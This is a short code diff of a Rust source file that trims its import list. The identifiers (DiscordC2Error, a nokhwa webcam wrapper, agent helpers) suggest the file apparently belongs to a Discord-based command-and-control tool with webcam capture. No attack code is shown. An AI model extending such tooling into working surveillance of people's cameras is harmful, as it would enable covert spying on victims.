@@ -1,4 +1,4 @@
-use crate::{errors::DiscordC2Error, libraries::nokhwa_wrapper::wrapper, discord_utils::bot_functions::send_channel_message, utils::agent::get_or_create_agent};
+use crate::{errors::DiscordC2Error, libraries::nokhwa_wrapper::wrapper};
 
 use serenity::{
     builder::{CreateApplicationCommand, CreateApplicationCommandOption},
